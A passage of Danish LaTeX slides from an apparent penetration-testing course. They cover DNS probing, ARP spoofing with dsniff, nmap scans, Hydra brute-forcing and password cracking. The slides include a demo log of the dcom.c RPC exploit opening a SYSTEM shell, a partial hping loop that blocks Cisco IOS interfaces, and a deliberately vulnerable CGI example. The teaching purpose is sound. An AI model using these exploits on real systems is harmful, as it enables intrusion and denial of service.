if [ $# -ne 1 ]; then
   echo "get name server version, need a target! "
   echo "Usage: $0 target"
   echo "example $0 10.1.2.3"
   exit 0
fi
TARGET=$1
# using dig 
start_time
dig @$1 version.bind chaos txt
echo Authors BIND er i versionerne 9.1 og 9.2 - måske ...
dig @$1 authors.bind chaos txt
stop_time
\end{alltt}
\centerline{\link{http://www.kramse.dk/files/tools/dns/bind-version}}

\slide{Små DNS tools dns-timecheck - Perl script}

\begin{alltt}\small
#!/usr/bin/perl
# modified from original by Henrik Kramshøj, hlk@kramse.dk
# 2004-08-19
#
# Original from: http://www.rfc.se/fpdns/timecheck.html
use Net::DNS;

my $resolver = Net::DNS::Resolver->new;
$resolver->nameservers($ARGV[0]);

my $query = Net::DNS::Packet->new;
$query->sign_tsig("n","test");

my $response = $resolver->send($query);
foreach my $rr ($response->additional) {
  print "localtime vs nameserver $ARGV[0] time difference: ";
  print$rr->time_signed - time() if $rr->type eq "TSIG";
}  
\end{alltt}
% inserting stupid $ to stop EMACS from
\centerline{\link{http://www.kramse.dk/files/tools/dns/dns-timecheck}}

\slide{Google for it}

\hlkimage{18cm}{images/googledorks-1.pdf}

\begin{list1}
\item Google som hacker værktøj?
\item Googledorks
\link{http://johnny.ihackstuff.com/}
\end{list1}


% opgaver session 1-4

\exercise{ex:whois}
\exercise{ex:basic-dns-lookup}
\exercise{ex:bind-version-script}
\exercise{ex:dns-timecheck}

%session 1-5

\slide{Hvordan virker ARP?}

\begin{center}
\colorbox{white}{\includegraphics[width=18cm]{images/arp-basic.pdf}}  
\end{center}

%server 00:30:65:22:94:a1\\
%client 00:40:70:12:95:1c\\
%hacker 00:02:03:04:05:06\\

\slide{Hvordan virker ARP? - 2}
\begin{list1}
\item {\bfseries ping 10.0.0.2} udført på server medfører
\item ARP Address Resolution Protocol request/reply:
  \begin{list2}
  \item ARP request i broadcast - Who has 10.0.0.2 Tell 10.0.0.1
  \item ARP reply (fra 10.0.0.2) 10.0.0.2 is at 00:40:70:12:95:1c
  \end{list2}
\item IP ICMP request/reply:
  \begin{list2}
    \item Echo (ping) request fra 10.0.0.1 til 10.0.0.2
\item Echo (ping) reply fra 10.0.0.2 til 10.0.0.1
\item ...
  \end{list2}
\item ARP udføres altid på Ethernet før der kan sendes IP trafik
\item (kan være RARP til udstyr der henter en adresse ved boot)
\end{list1}


\slide{Hvordan virker ARP spoofing?}

\begin{center}
\colorbox{white}{\includegraphics[width=15cm]{images/arp-spoof.pdf}}  
\end{center}

\begin{list1}
\item Hackeren sender forfalskede ARP pakker til de to parter
\item De sender derefter pakkerne ud på Ethernet med hackerens MAC
  adresse som modtager - han får alle pakkerne
\end{list1}

\slide{Forsvar mod ARP spoofing}

\begin{list1}
\item Hvad kan man gøre? 
\item låse MAC adresser til porte på switche
\item låse MAC adresser til bestemte IP adresser
\item Efterfølgende administration!
\vskip 1 cm
\item {\bfseries arpwatch er et godt bud} - overvåger ARP
\item bruge protokoller som ikke er sårbare overfor opsamling
\end{list1}


\slide{FTP}
\begin{list1}
\item File Transfer Protocol - filoverførsler
\item Trivial File Transfer Protocol - uautentificerede filoverførsler
\item De bruges især til:
  \begin{list2}
    \item FTP - drivere, dokumenter, rettelser - Windows Update? er
    enten HTTP eller FTP
\item TFTP bruges til boot af netværksklienter uden egen harddisk
  \end{list2}
\item FTP sender i klartekst\\ 
{\bfseries USER brugernavn} og \\
{\bfseries PASS hemmeligt-kodeord} 
\end{list1}

\slide{POP3 - e-mail i Danmark}

\vskip 1 cm

\begin{list1}
  \item POP3 sender brugernavn og kodeord i klartekst - ligesom FTP
\item bruges dagligt af næsten alle privatkunder
\item  alle internetudbydere og postudbydere tilbyder POP3
\item der findes en variant, POP3 over SSL/TLS
\end{list1}



\slide{dsniff}

\begin{list1}
\item en sniffer til mange usikre protokoller
\item inkluderer {\bfseries arpspoof}  
\item Lavet af Dug Song, dugsong@monkey.org
\end{list1}

\begin{alltt}
dsniff  is  a  password sniffer which handles FTP, Telnet,
SMTP, HTTP, POP, poppass, NNTP, IMAP, SNMP, LDAP,  Rlogin,
RIP,  OSPF,  PPTP  MS-CHAP, NFS, VRRP, YP/NIS, SOCKS, X11,
CVS, IRC, AIM, ICQ, Napster,  PostgreSQL,  Meeting  Maker,
Citrix  ICA,  Symantec  pcAnywhere, NAI Sniffer, Microsoft
SMB, Oracle SQL*Net, Sybase and Microsoft SQL protocols.
\end{alltt}

\slide{dsniff forudsætninger}

\begin{list1}
\item Der er visse forudsætninger der skal være opfyldt
  \begin{list2}
\item Man skal have trafikken
\item Det kan gøres gennem arp spoofing eller ved at hacke ind i et
  system/router på netværksvejen
\end{list2}
\end{list1}

\begin{center}
  \colorbox{white}{\includegraphics[width=12cm]{images/arp-spoof.pdf}}  
\end{center}

\slide{Kommenteret dsniff}

\hlkimage{22cm}{images/dsniff-comments.pdf}


\slide{netværksdesign og sikkerhed}

\begin{list1}
  \item Hvad kan man gøre for at få bedre netværkssikkerhed?
    \begin{list2}
    \item bruge switche - der skal ARP spoofes og bedre performance
    \item opdele med firewall til flere DMZ zoner for at holde
      udsatte servere adskilt fra hinanden, det interne netværk og
      Internet
    \item overvåge, læse logs og reagere på hændelser 
    \end{list2}
\end{list1}


\slide{Intrusion Detection Systems - IDS}

\begin{list1}
  \item angrebsværktøjerne efterlader spor

\item hostbased IDS - kører lokalt på et system og forsøger at
  detektere om der er en angriber inde
\item network based IDS - NIDS - bruger netværket
\item Automatiserer netværksovervågning:
  \begin{list2}
  \item bestemte pakker kan opfattes som en signatur
\item analyse af netværkstrafik - FØR angreb
\item analyse af netværk under angreb - sender en alarm
  \end{list2}
\item \link{http://www.snort.org} - det kan anbefales at se på Snort
\end{list1}

\slide{Ulemper ved IDS}

\hlkimage{5cm}{images/snort_tm.png}

\begin{list1}
\item snort er baseret på signaturer
\item mange falske alarmer - tuning og vedligehold
\item hvordan sikrer man sig at man har opdaterede signaturer for
  angreb som går verden rundt på et døgn 
\end{list1}

\slide{Honeypots - ressourcekrævende?}

\begin{list1}
\item \emph{The Use of Honeynets to Detect Exploited Systems
Across Large Enterprise Networks}
\begin{quote}
\small
"There are 69 separate departments at Georgia Tech with between 30,000-35,000
networked computers installed on campus."
...
"In the six months that we have been running the Georgia
Tech Honeynet {\bfseries we have detected 16 compromised
Georgia Tech systems on networks} other than our
Honeynet. These compromises include automated worm
type exploits as well as individual systems that have been
targeted and compromised by hackers."
\end{quote}

\item Honeypots og IDS systemer kan være ressourcekrævende, men
en kombination kan være mere effektiv i visse tilfælde

\item Kilde:
\link{http://www.tracking-hackers.com/papers/gatech-honeynet.pdf}  
\end{list1}


\slide{TCP sequence number prediction}

\begin{list1}
  \item tidligere baserede man ofte login og adgange på de IP adresser
  som folk kom fra
\item det er ikke pålideligt at tro på address based authentication
\item TCP sequence number kan måske gættes
\item Mest kendt er nok Shimomura der blev hacket på den måde, måske
  af Kevin D Mitnick eller en kompagnon
\end{list1}

% opgaver session 1-5

\exercise{ex:arpspoof}

\slide{Basal Portscanning}

\begin{list1}
  \item Hvad er portscanning
\item afprøvning af alle porte fra 0/1 og op til 65535
\item målet er at identificere åbne porte - sårbare services
\item typisk TCP og UDP scanning
\item TCP scanning er ofte mere pålidelig end UDP scanning
\end{list1}

{\hlkbig TCP handshake er nemmere at identificere

UDP applikationer svarer forskelligt - hvis overhovedet}

\slide{TCP three way handshake}

\hlkimage{7cm}{images/tcp-three-way.pdf}

\begin{list2}
\item {\bfseries TCP SYN half-open} scans
\item Tidligere loggede systemer kun når der var etableret en fuld TCP
  forbindelse - dette kan/kunne udnyttes til \emph{stealth}-scans
\item Hvis en maskine modtager mange SYN pakker kan dette fylde
  tabellen over connections op - og derved afholde nye forbindelser
  fra at blive oprette - {\bfseries SYN-flooding}
\end{list2}


\slide{Ping og port sweep}

\begin{list1}
\item scanninger på tværs af netværk kaldes for sweeps 
\item Scan et netværk efter aktive systemer med PING
\item Scan et netværk efter systemer med en bestemt port åben
\item Er som regel nemt at opdage:
  \begin{list2}
    \item konfigurer en maskine med to IP-adresser som ikke er i brug
\item hvis der kommer trafik til den ene eller anden er det portscan
\item hvis der kommer trafik til begge IP-adresser er der nok
  foretaget et sweep - bedre hvis de to adresser ligger et stykke fra hinanden
  \end{list2}

\end{list1}

\slide{nmap port sweep efter port 80/TCP}

\begin{list1}
  \item Port 80 TCP er webservere
\end{list1}

\begin{alltt}
\small # {\bfseries nmap  -p 80 217.157.20.130/28}

Starting nmap V. 3.00 ( www.insecure.org/nmap/ )
Interesting ports on router.kramse.dk (217.157.20.129):
Port       State       Service
80/tcp     filtered    http                    

Interesting ports on www.kramse.dk (217.157.20.131):
Port       State       Service
80/tcp     open        http                    

Interesting ports on  (217.157.20.139):
Port       State       Service
80/tcp     open        http                    

\end{alltt}

\slide{nmap port sweep efter port 161/UDP}

\begin{list1}
  \item Port 161 UDP er SNMP
\end{list1}

\begin{alltt}  
\small # {\bfseries nmap -sU -p 161 217.157.20.130/28}

Starting nmap V. 3.00 ( www.insecure.org/nmap/ )
Interesting ports on router.kramse.dk (217.157.20.129):
Port       State       Service
161/udp    open        snmp                    

The 1 scanned port on mail.kramse.dk (217.157.20.130) is: closed

Interesting ports on www.kramse.dk (217.157.20.131):
Port       State       Service
161/udp    open        snmp                    

The 1 scanned port on  (217.157.20.132) is: closed
\end{alltt}

\slide{OS detection}
\begin{alltt}
\footnotesize
# nmap -O ip.adresse.slet.tet \emph{scan af en gateway}
Starting nmap 3.48 ( http://www.insecure.org/nmap/ ) at 2003-12-03 11:31 CET
Interesting ports on gw-int.security6.net (ip.adresse.slet.tet):
(The 1653 ports scanned but not shown below are in state: closed)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
1080/tcp open  socks
5000/tcp open  UPnP
Device type: general purpose
Running: FreeBSD 4.X
OS details: FreeBSD 4.8-STABLE
Uptime 21.178 days (since Wed Nov 12 07:14:49 2003)
Nmap run completed -- 1 IP address (1 host up) scanned in 7.540 seconds
\end{alltt}

\begin{list2}
  \item lavniveau måde at identificere operativsystemer på
\item send pakker med \emph{anderledes} indhold
\item Reference: \emph{ICMP Usage In Scanning} Version 3.0,
  Ofir Arkin\\ \link{http://www.sys-security.com/html/projects/icmp.html}
\end{list2}

% opgaver session 1-6 

\exercise{ex:nmap-pingsweep}
\exercise{ex:nmap-synscan}
\exercise{ex:nmap-os}
\exercise{ex:nmap-service}

% afslutning dag 1
\slide{Erfaringer hidtil}

\begin{list1}
  \item mange oplysninger
\item kan man stykke oplysningerne sammen kan man sige en hel del om
  netværket 
\item en skabelon til registrering af maskiner er god
  \begin{list2}
    \item svarer på ICMP: $\Box$\  echo, $\Box$\ mask, $\Box$\ time
\item svarer på traceroute: $\Box$\ ICMP, $\Box$\ UDP
\item Åbne porte TCP og UDP: 
\item Operativsystem:
\item ... (banner information m.v.)
  \end{list2}
\item Mange små pakker kan oversvømme store forbindelser og
  give problemer for netværk
\end{list1}


\slide{Vurdering af produkter}

\begin{list1}
\item Pentesting er ikke kun til test af produktionsnetværk
\item man skal ofte vurdere nye produkter - sikkerhedsmæssigt og
  funktionalitetsmæssigt - yder det beskyttelse, forbedrer det
  sikkerheden m.v.
\end{list1}

\slide{Hvad er værdien af pentest?}

\begin{list1}
\item hvor og hvordan kan I bruge penetrationstest
\item hvis man vil have et andet indblik i netværket, TCP, UDP, ICMP,
  portscannning og samle puslespil udfra få informationer 
\item Netværksadministratorer kan bruge pentesting til at sikre egne
  netværk ved brug af samme teknikker som hackere
\item IT-/sikkerheds-chef vurdere og evaluere tilbud og løsninger for
  sikkerheden. Er den påtænkte løsning fornuftig?
\item Man står med en server der er kompromitteret - hvordan skete
  det? - hvordan forhindrer vi det en anden gang. 
\end{list1}



% dag 2
% session 2-1



\slide{Simple Network Management Protocol}

\begin{list1}
\item SNMP er en protokol der supporteres af de fleste professionelle
  netværksenheder, såsom switche, routere
\item hosts - skal slås til men følger som regel med
\item SNMP bruges til: 
  \begin{list2}
    \item \emph{network management}
    \item statistik
    \item rapportering af fejl - SNMP traps
  \end{list2}
\item {\bfseries sikkerheden baseres på community strings der sendes
    som klartekst ...}
\item det er nemmere at brute-force en community string end en
  brugerid/kodeord kombination
\end{list1}

\slide{brute force}

\begin{list1}
\item hvad betyder bruteforcing?\\
afprøvning af alle mulighederne
\end{list1}

\begin{alltt}
\small
Hydra v2.5 (c) 2003 by van Hauser / THC <vh@thc.org>
Syntax: hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] 
[-o FILE] [-t TASKS] [-g TASKS] [-T SERVERS] [-M FILE] [-w TIME] 
[-f] [-e ns] [-s PORT] [-S] [-vV] server service [OPT]

Options:
  -S        connect via SSL
  -s PORT   if the service is on a different default port, define it here
  -l LOGIN  or -L FILE login with LOGIN name, or load several logins from FILE
  -p PASS   or -P FILE try password PASS, or load several passwords from FILE
  -e ns     additional checks, "n" for null password, "s" try login as pass
  -C FILE   colon seperated "login:pass" format, instead of -L/-P option
  -M FILE   file containing server list (parallizes attacks, see -T)
  -o FILE   write found login/password pairs to FILE instead of stdout
...  
\end{alltt}

\slide{Routing}

\vskip 1 cm

\begin{list1}
  \item routing table - tabel over netværkskort og tilhørende adresser
\item default gateway - den adresse hvortil man sender
  \emph{non-local} pakker\\kaldes også default route, gateway of last
  resort
\item routing styres enten manuelt - opdatering af route tabellen,
  eller konfiguration af adresser og subnet maske på netkort
\item eller automatisk ved brug af routing protocols - interne og
  eksterne route protokoller
\item de lidt ældre routing protokoller har ingen sikkerhedsmekanismer
\end{list1}

\slide{Source routing}

\begin{list1}
\item source routing - mulighed for at specificere en ønsket vej for
  pakken
 
  \item Hvis en angriber kan fortælle hvilken vej en pakke skal følge
  kan det give anledning til sikkerhedsproblemer
\item maskiner idag bør ikke lytte til source routing, evt. skal de
  droppe pakkerne
\end{list1}

\slide{Angreb mod routing}

\begin{list1}
  \item falske routing updates til protokollerne
\item sende redirect til maskiner

\item Der findes (igen) specialiserede programmer til at teste og
  forfalske routing updates, svarende til icmpush programmet
\item Det anbefales at sikre routere bedst muligt - eksempelvis 
Secure IOS template der findes på adressen:\\
\link{http://www.cymru.com/Documents/secure-ios-template.html}
\end{list1}




\slide{Incidents.org}

\hlkimage{9cm}{images/incidents-january.png}  

\begin{list1}
  \item \link{www.incidents.org} følger hele tiden med i angreb
- man kan selv hente software og bidrage med logs
\end{list1}

\slide{Hvordan ser en orm ud på nettet?}

\hlkimage{18cm}{images/sqlworm-matrix.png}  

\begin{center}
Internet statistik fra januar - SQL Sapphire/Slammer ormen\\
Kilde: 
\link{http://average.matrix.net/Daily/markR.html}
\end{center}


\slide{Hændelseshåndtering}

\hlkimage{13cm}{images/virksomhedens-netvaerk.pdf}
\begin{list1}
\item Du VIL komme ud for hændelser, man kan ikke regne med at
sikkerhedsforanstaltninger altid virker
\item Der er hændelser - men opdager I dem?
  \begin{list2}
  \item Der ER sket en hændelse - håndterer I den effektivt? - hvad er
    forøvrigt optimalt? Lav en plan for håndtering af hændelser
  \end{list2}
\end{list1}

\slide{Hændelseshåndtering - en metode}

\begin{list1}
\item Vær forberedt på at håndtere hændelser!
\item Incident Response, E. Eugene Schultz og Russel Shumway foreslår: 
  \begin{list2}
    \item Preparation - forberedelse lær at snakke med politiet, hav
    kontaktinformation på plads, mobiltelefonnumre m.v.
\item Detection - man opdager, her kan integritetscheckere og IDS hjælpe
\item Containment - indkapsling, undgå spredning til andre systemer
\item Eradication - udryddelse af problemet, eventuelt reinstallation
  af systemer
\item Recovery - sæt systemerne i produktion igen
\item Follow-up - undgå det sker igen, opsamling af statistik om hændelser
  \end{list2}

\item \emph{ Incident Response: A Strategic Guide to Handling System
 and Network Security Breaches} 
 af E. Eugene, Dr Schultz, Russell Shumway, Que, 2002
\end{list1}


\slide{ISC BIND}

\begin{list1}
\item Den mest benyttede navneserver på Internet er BIND
\item Der findes alternativer, men ingen har samme funktionalitet
\item \link{http://www.isc.org} er adressen til ISC - Internet
  Software Consortium  
\item konfigurationsfilen er {\bfseries named.conf} - for version 8 og 9

\item \link{http://www.dnsreport.com} er adressen til et godt sted at
  teste DNS for domæner
\end{list1}



\slide{BIND sårbarheder}

\begin{list1}
\item Navneservere er tit under angreb, hvorfor?!
  \begin{list2}
  \item Står på netværk med god forbindelse
  \item Har kendte adresser
  \item Kører oftest ISC BIND
  \item BIND har mange funktioner - mange fejl
  \item Den der kontrollerer navneservere kan omdirigere trafik
  \end{list2}
\end{list1}


\slide{RIPE NSD navneserver}

\begin{list1}
\item RIPE skiftede software på deres navneserver væk fra BIND og til
  en ny DNS implementation NSD 
\item Den navneserver som RIPE bestyrer hedder K
\item Er det en fordel? hvorfor?
\end{list1}



% opgaver session 2-1

\exercise{ex:find-snmp}
\exercise{ex:hydra-brute}



\slide{NT hashes}

\begin{list1}
  \item NT LAN manager hash værdier er noget man typisk kan samle op i
  netværk 
\item det er en hash værdi af et password som man ikke burde kunne
  bruge til noget - hash algoritmer er envejs
\item opbygningen gør at man kan forsøge brute-force på 7 tegn ad
  gangen!
\item en moderne pc med l0phtcrack kan nemt knække de fleste password
  på få dage!
\item og sikkert 25-30\% indenfor den første dag - hvis der ingen
  politik er omkring kodeord! 
\item ved at generere store tabeller, eksempelvis 100GB kan man dække
  mange hashværdier af passwords med almindelige bogstaver, tal og
  tegn - og derved knække passwordshashes på sekunder. Søg efter
  rainbowcrack med google
\end{list1}

\slide{l0phtcrack LC4}
\begin{center}
\colorbox{white}{\includegraphics[width=10cm]{images/lc4_splash.png}}  
\end{center}

\begin{alltt}
\small
Consider that at one of the largest technology companies, where policy
required that passwords exceed 8 characters, mix cases, and include
numbers or symbols...   
        
L0phtCrack obtained 18\% of the passwords in 10 minutes         
90\% of the passwords were recovered within 48 hours on a Pentium II/300           
The Administrator and most Domain Admin passwords were cracked 
\link{http://www.atstake.com/research/lc/}
\end{alltt}

\slide{Cain og Abel}

%\hlkimage{10cm}{cain_brute_attack.jpg}
\hlkimage{20cm}{cain-win.png}

\begin{list1}
\item  Cain og Abel anbefales ofte istedet for l0phtcrack
  \link{http://www.oxid.it}
\end{list1}

\slide{John the ripper}

\begin{quote}
John the Ripper is a fast password cracker, currently available for
many flavors of Unix (11 are officially supported, not counting
different architectures), Windows, DOS, BeOS, and OpenVMS. Its primary
purpose is to detect weak Unix passwords. Besides several crypt(3)
password hash types most commonly found on various Unix flavors,
supported out of the box are Kerberos AFS and Windows NT/2000/XP/2003
LM hashes, plus several more with contributed patches.   
\end{quote}

\begin{list1}
\item UNIX passwords kan knækkes med alec Muffets kendte Crack program
  eller eksempelvis John The Ripper \link{http://www.openwall.com/john/}  
\item Jeg bruger selv John The Ripper
\end{list1}

\slide{kryptering, PGP og SSL/TLS}

\begin{list1}
  \item kryptering er den eneste måde at sikre:
    \begin{list2}
      \item fortrolighed
      \item autenticitet
    \end{list2}
\item kryptering består af:
  \begin{list2}
    \item Algoritmer - eksempelvis RSA
    \item \emph{protokoller} - måden de bruges på
\item programmer - eksempelvis PGP
\end{list2}
\item fejl eller sårbarheder i en af komponenterne kan formindske
  sikkerheden  
\item PGP = mail sikkerhed, se eksempelvis Enigmail plugin til Mozilla Thunderbird
\item Secure Sockets Layer SSL / Transport Layer Services TLS =
  webservere og klienter
\end{list1}


\slide{DES, Triple DES og AES/Rijndael}

%\hlkimage{15cm}{images/AES_head.png}

\begin{list1}
\item DES kryptering baseret på den IBM udviklede Lucifer algoritme
  har været benyttet gennem mange år. 
\item Der er vedtaget en ny standard algoritme Advanced Encryption
  Standard (AES) som afløser Data Encryption Standard (DES)
\item Algoritmen hedder Rijndael og er udviklet
af Joan Daemen og Vincent Rijmen.
%\item \emph{Rijndael is available for free. You can use it for
%whatever purposes  you want, irrespective of whether
%it is accepted as AES or not.}
\item Kilder:
\link{http://csrc.nist.gov/encryption/aes/} - AES Homepage\\
\link{http://www.esat.kuleuven.ac.be/~rijmen/rijndael/} - The Rijndael Page
\end{list1}


\slide{Windows RPC CVE-2003-0352} 

\begin{list1}
\item Hackergruppe "Last Stage of Delirium" finder sårbarhed i RPC
\item Den 27. juni 2003skrev LSD til Microsoft om fejlen
\begin{list2}
  

\item Microsoft har frigivet rettelser i juli 2003. 
\item LSD har ry for at arbejde seriøst sammen med
produkt-leverandørerne. De kommunikerer sårbarheder til
leverandørerne og frigiver ikke "exploit-programmer" før
leverandørerne har fået en fair chance til at løse deres
problemer. 

\item Beskrivelse af sårbarheden kan findes hos Microsoft på:\\
\link{http://microsoft.com/technet/treeview/default.asp?url=/technet/security/bulletin/MS03-026.asp}
\end{list2}
\item Kilder:\\
%\link{http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-0352}\\
\link{http://www.securityfocus.com/news/6519}\\
\link{http://www.cert.org/advisories/CA-2003-16.html}\\
\link{http://lsd-pl.net/} -  detaljerede beskrivelser af exploits
\end{list1}


\slide{Start på demo}

\hlkimage{16cm}{images/server-client.pdf}

\begin{list2}
\item To almindelige computere - en switch erstatter Internet
\item Windows er installeret på et system og ikke opdateret
\item dcom.c exploit er hentet fra Internet og bruges næsten uændret
\end{list2}


\slide{Hvad sker der?}

\begin{alltt}
[hlk@fiona hlk]$ ./dcom 6 10.0.0.206
---------------------------------------------------------
- Remote DCOM RPC Buffer Overflow Exploit
- Original code by FlashSky and Benjurry
- Rewritten by HDM <hdm [at] metasploit.com>
- Using return address of 0x77e626ba
- Dropping to System Shell...

Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

\verb+C:\WINDOWS\system32>exit+   {\bf - find selv på kommandoer, fri adgang!!}

 - Read failure
[hlk@fiona hlk]$ 
\end{alltt}

\slide{RPC sårbarheden udnyttes!}

\begin{quote}
*WINDOWS RPC FLAW EXPLOITED IN CAMPUS HACKER ATTACKS
California universities are among the first public victims of the Windows
Remote Procedure Call (RPC) protocol flaw, which allows an attacker to run
code of choice on a compromised system.

Cedric Bennett, director of information security at Stanford University,
says 2,400 of his school's computers were tainted with deeply imbedded
code. The unauthorized code, which Bennett declined to describe in detail,
will have to be manually removed, a process that could take several hours
for each compromised machine.
...
\end{quote}
Citat fra: SECURITY WIRE DIGEST, VOL. 5, NO. 60, AUGUST 11, 2003
Security Wire Digest is a newsletter published by Information Security,
the industry's leading source of security news and information.
\link{http://infosecuritymag.techtarget.com}

\slide{Windows RPC/dcom - Blaster orm}

\begin{list1}
\item Kilde: Symantec - 12/8 2003
  \begin{list2}
    
  \item THREAT:          W32.Blaster.Worm
  \item CATEGORY:  3
    W32.Blaster.Worm is a worm that will exploit the DCOM RPC
    vulnerability using TCP port 135. It will attempt to download and
    run a file, msblast.exe. 
  \item STEP 1: Read Critical Information  
  \item STEP 2: Update your Virus Definitions
    
  \end{list2}
  
\item Situationen er den sædvanlige - den almindelige livscyklus for
  en sårbarhed
  \begin{list2}
    \item[10] Der findes en sårbarhed - hackergruppe, leverandør eller
    sikkerhedskonsulent
\item Leverandøren kontaktes og på et tidspunkt offentliggøres
  informationen
\item Der kommer proof-of-concept kode (PoC), exploit program
\item Sårbarheden bliver populær
\item Der kommer en orm - og folk går i panik
%\item \emph{goto 10}
  \end{list2}

\end{list1}

\slide{Cisco Denial of service CVE-2003-0567} 

\begin{list1}
\item Cisco routere - ude af drift angreb - juli 2003
  \begin{list2}
    

\item Med en bestemt sekvens af pakker til routerens egen adresse på
  et interface kan den bringes i en tilstand hvor den ikke sender
  pakker videre - dødt interface
\item \emph{This issue affects all Cisco devices running Cisco IOS software
  and          configured to process Internet Protocol version 4
  (IPv4) packets. This includes          routers as well as switches
  and line cards which run Cisco IOS software. Cisco          devices
  which do not run Cisco IOS software are not affected.} 

\item kræver genstart

\item pakkerne kan sågar genereres med et shellscript (batch fil) og
  programmer som hping\\ 
  \end{list2}
\item Kilder:\\
\link{http://www.cisco.com/warp/public/707/cisco-sa-20030717-blocked.shtml}\\
\link{http://www.cert.org/advisories/CA-2003-15.html}\\
\link{http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-0567}
\end{list1}

\slide{Cisco \emph{exploit} script}


\begin{alltt}    
\small
#!/bin/sh
# 2003-07-21 pdonahue
# cisco-44020.sh
# -- this shell script is just a wrapper for hping (http://www.hping.org)
#    with the parameters necessary to fill the input queue on
# exploitable IOS device
# -- refer to "Cisco Security Advisory: Cisco IOS Interface Blocked by
# IPv4 Packets" 
# (http://www.cisco.com/warp/public/707/cisco-sa-20030717-blocked.shtml)
#for more information 
...
for protocol in $PROT
    do
       $HPING $HOST --rawip $ADDR --ttl $TTL --ipproto $protocol \\
       --count $NUMB --interval u250 --data $SIZE --file /dev/urandom
    done

\end{alltt}


\slide{Sårbarheder - CVE og ICAT}

\begin{list1}
\item Common Vulnerabilities and Exposures (CVE) er:
  \begin{list2}
  \item klassifikation
  \item unik navngivning af sårbarheder. 
  \end{list2}
\item Sårbarheder tildeles
  \begin{list2}
  \item initielt oprettes med status CANDIDATE
  \end{list2}
\item CVE vedligeholdes af MITRE - som er en not-for-profit 
organisation skabt til forskning og udvikling i USA.
National Vulnerability Database er en af mulighederne for at søge i CVE. 
%\item CVE er et kvantespring indenfor sikkerhed - og en stor succes!
\item Kilde: \link{http://cve.mitre.org/} og \link{http://nvd.nist.gov}
\item Se også \link{http://www.owasp.org/} angående websårbarheder
\end{list1}

\slide{ICAT klassifikation af sårbarheder}

\begin{list1}
\item ICAT is a fine-grained searchable index of standardized
  vulnerabilities that links users into publicly available
  vulnerability and patch information 
\item ICAT klassificerer efter:
  \begin{list2}
  \item Input validation error, Boundary overflow og Buffer overflow
  \item Access validation error
  \item Exceptional condition handling error
  \item Environmental error
  \item Configuration error
  \item Race condition
  \item Design error
  \item Other
  \end{list2}
\item Kilde:
  \link{http://icat.nist.gov/icat.cfm}
\end{list1}

\slide{Sårbarheder - eksempler}

\begin{list1}
\item \small CVE-2000-0884\\
IIS 4.0 and 5.0 allows remote attackers to read documents outside of
the web root, and possibly execute arbitrary commands, via malformed
URLs that contain UNICODE encoded characters, aka the "Web Server
Folder Traversal" vulnerability.   

\item \small CVE-2002-1182\\ 
IIS 5.0 and 5.1 allows remote attackers to cause a denial of service
(crash) via malformed WebDAV requests that cause a large amount of
memory to be assigned.    

\item CVE Version: 20020625 Total Entries: 2223
opdateres ikke så ofte, ICAT opdateres løbende og er kompatibel med CVE

\item ICAT contains: 5356 vulnerabilities                 
Last updated: 01/07/03

\item Kilde:\\
\link{http://cve.mitre.org/ - CVE}\\
\link{http://icat.nist.gov/icat.cfm} - ICAT
\end{list1}


\slide{Altid aktuelt - DNS og web}

\begin{list1}
\item Navneservere er tit under angreb, hvorfor?!
  \begin{list2}
  \item Står på netværk med god forbindelse
  \item Har kendte adresser
  \item Kører oftest ISC BIND
  \item BIND har mange funktioner - mange fejl
  \item Den der kontrollerer navneservere kan omdirigere trafik
  \end{list2}
\item webservere er altid under angreb
  \begin{list2}
\item Webserveren er virksomhedens ansigt ud mod Internet eller måske
  selve indtjeningen - for e-handel
    \item Microsoft Internet Information Services - IIS - kendt og
    berygtet for at indeholder megen funktionalitet - farlig
    funktionalitet
\item Apache har haft nogle grimme oplevelser for nyligt, og PHP er en
  kilde til mange sikkerhedsproblemer - hvem sagde PHP Nuke?!
  \end{list2}
\end{list1}


\slide{Windows NT familien}

\begin{list1}
\item Windows NT, Windows 2000 - server og workstation versioner
\item Læg mærke til de applikationer i lægger ovenpå - åbner porte!
\begin{list2}
\item Internet Information Services IIS
\item databaser
\item diverse klienter - TSM klient!
\end{list2}
\item Opsætning af Microsoft Internet Information Services IIS\\
brug Microsoft's egne guider og andre checklister
\item Eksempelvis Gold Standard\\
{\small \emph{Windows 2000 Professional Gold Standard Security Benchmarks
are available for download at: 
Center for Internet Security \link{www.cisecurity.org} 
The National Security Agency \link{www.nsa.gov}}} 
\end{list1}


\slide{konfigurationsfejl - ofte overset}

\begin{list1}
\item Forkert brug af programmer er ofte overset
\begin{list2}
\item opfyldes forudsætningerne
\item er programmet egnet til dette miljø
\item er man udannet/erfaren i dette produkt
\end{list2}
\item Kunne I finde på at kopiere cmd.exe til
/scripts kataloget på en IIS?
\item Det har jeg engang været ude for at en kunde havde gjort!
\item hvis I under test af en server opdager at denne har
  /scripts/cmd1.exe eller "FTP-scripts" til at hente værktøjer ...
så er den pågældende server formentlig kompromitteret 
\end{list1}

\slide{Insecure programming}

\vskip 2 cm

\begin{list1}
\item Problem:\\
Ønsker et simpelt CGI program, en web udgave af finger
\item Formål:\\
Vise oplysningerne om brugere på systemet
\end{list1}

\slide{review af nogle muligheder}

\begin{list1}
\item ASP
\begin{list2}
\item server scripting, meget generelt - man kan alt
\end{list2}

\item SQL
\begin{list2}
\item databasesprog - meget kraftfuldt
\item mange databasesystemer giver mulighed for specifik tildeling af
  privilegier "grant" 
  \end{list2}
\item JAVA
\begin{list2}
\item generelt programmeringssprog
\item bytecode verifikation
\item indbygget sandbox funktionalitet 
\end{list2}
\item Perl og andre generelle programmeringssprog
\item Pas på shell escapes!!!
\end{list1}

\slide{Hello world of insecure web CGI}

\begin{list1}
\item Demo af et sårbart system - badfinger
\item Løsning:
\begin{list2}
\item Kalde finger kommandoen
\item et Perl script
\item afvikles som CGI 
\item standard Apache HTTPD 1.3 server
\end{list2}
\end{list1}

\slide{De vitale - og usikre dele}

{\small
\begin{verbatim}
print "Content-type: text/html\n\n<html>";
print "<body bgcolor=#666666 leftmargin=20 topmargin=20"; 
print "marginwidth=20 marginheight=20>";
print <<XX;
<h1>Bad finger command!</h1>
<HR COLOR=#000>
<form method="post" action="bad_finger.cgi">
Enter userid: <input type="text" size="40" name="command">
</form>
<HR COLOR=#000>
XX
if(&ReadForm(*input)){
    print "<pre>\n";
